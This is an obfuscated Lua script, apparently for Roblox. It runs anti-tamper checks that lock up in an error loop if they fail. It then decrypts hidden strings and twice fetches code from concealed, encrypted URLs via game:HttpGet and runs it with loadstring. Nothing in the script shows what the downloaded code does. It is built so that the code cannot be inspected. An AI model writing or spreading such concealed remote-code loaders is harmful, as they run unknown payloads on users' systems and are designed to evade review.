local v1 = true
local v2 = string.gmatch
local v3 = function()
    error("Tamper Detected!")
end
local v4 = false
local v5 = (pcall(function()
    v4 = true
end) and v4)
local v6 = math.random
local v7 = table.concat
local v8 = ((table and table.unpack) or unpack)
local v9 = v6(3, 65)
local v10 = 0
local v11 = 0
local v12 = { pcall(function()
    return ("2LFLEVzPW" / (5676979 - ("7JNwMj8E" ^ 13110878)))
end) }
local v13 = v12[2]
local v14 = tonumber(v2(tostring(v13), ":(%d*):")())
for v15 = 1, v9 do
    local v16 = math.random(1, 100)
    local v17 = v6(0, 255)
    local v18 = v6(1, v16)
    local v19 = (v6(1, 2) == 1)
    local v20 = v13.gsub(v13, ":(%d*):", (":" .. (tostring(v6(0, 10000)) .. ":")))
    local v21 = { pcall(function()
        if ((v6(1, 2) == 1) or (v15 == v9)) then
            local v3 = tonumber(v2(tostring(({ pcall(function()
                return ("Sy9bGMulO" / (14904857 - ("NLkMCHyaqUiJx" ^ 2280835)))
            end) })[2]), ":(%d*):")())
            v1 = (v1 and (v14 == v3))
        end
        if v19 then
            error(v20, 0)
        end
        local t1 = {}
        for v4 = 1, v16 do
            t1[v4] = v6(0, 255)
        end
        t1[v18] = v17
        return v8(t1)
    end) }
    if v19 then
        v1 = (v1 and ((v21[1] == false) and (v21[2] == v20)))
    else
        v1 = (v1 and v21[1])
        v10 = ((v10 + v21[(v18 + 1)]) % 256)
        v11 = ((v11 + v17) % 256)
    end
end
v1 = (v1 and (v10 == v11))
if v1 then
else
    repeat
        return (function()
            while true do
                l1, l2 = l2, l1
                v3()
            end
        end)()
    until true
end
local v22 = nil
local v23 = nil
local v24 = {}
local v25 = math.floor
local v26 = math.random
local v27 = table.remove
local v28 = string.char
local v29 = 0
local v30 = 2
local v31 = {}
local v32 = {}
local v33 = 0
for v34 = 1, 256 do
    v24[v34] = v34
end
repeat
    local v35 = v26(1, (#v24))
    local v36 = v27(v24, v35)
    v31[v36] = v28((v36 - 1))
until ((#v24) == 0)
local v37 = nil
local v38 = {}
local v39 = function()
    if ((#v38) == 0) then
        v29 = (((v29 * 169) + 9611351544187) % 35184372088832)
        repeat
            v30 = ((v30 * 216) % 257)
        until (v30 ~= 1)
        local v1 = (v30 % 32)
        local v2 = ((v25((v29 / (2 ^ (13 - ((v30 - v1) / 32))))) % 4294967296) / (2 ^ v1))
        local v3 = (v25(((v2 % 1) * 4294967296)) + v25(v2))
        local v4 = (v3 % 65536)
        local v5 = ((v3 - v4) / 65536)
        local v6 = (v4 % 256)
        local v7 = ((v4 - v6) / 256)
        local v8 = (v5 % 256)
        local v9 = ((v5 - v8) / 256)
        v38 = { v6, v7, v8, v9 }
    end
    return table.remove(v38)
end
local v40 = {}
v22 = setmetatable({}, { __index = v40, __metatable = v37 })
v23 = function(v2, v3)
    local v1 = v40
    if v1[v3] then
    else
        v38 = {}
        local v4 = v31
        v29 = (v3 % 35184372088832)
        v30 = ((v3 % 255) + 2)
        local v5 = string.len(v2)
        v1[v3] = ""
        local v6 = 93
        for v7 = 1, v5 do
            v6 = (((string.byte(v2, v7) + v39()) + v6) % 256)
            v1[v3] = (v1[v3] .. v4[(v6 + 1)])
        end
    end
    return v3
end
task[v22[v23("\195d|\148\159", 29215932036388)]](function()
    loadstring(game:HttpGet(v22[v23("?\170pl\025\195\208\226.G\146-U\252\205\129\1754%\027\156>\154\028\030v\029\025s\002\1507W+A\179\132\185\224\168\161V\024\175%\130\197\143\230\242\164s\1346A\141\196\246\193\248\229\198]1\158\172V\250\129%\019\199", 15585358306393)]))()
end)
task[v22[v23("\216\187q1&", 737367376215)]](function()
    loadstring(game.HttpGet(game, (function(v1)
        return v1:gsub(v22[v23("c|", 1740666241834)], function(v1)
            return string[v22[v23("l\240\170\250", 13494449330315)]](tonumber(v1, 16))
        end)
    end)(v22[v23("\205Rw\020\011o\241\177/\137\236\153\195|\016P\142\025I(\187\222\169s\214\002\140\127\159\236\187\232\215\184\227\150n~\206\173A\171I0\023\178\254F\001V\152\220\163\142Gp\253\236\011\022\218\131\215U\207=", 8751066566635)])))()
end)
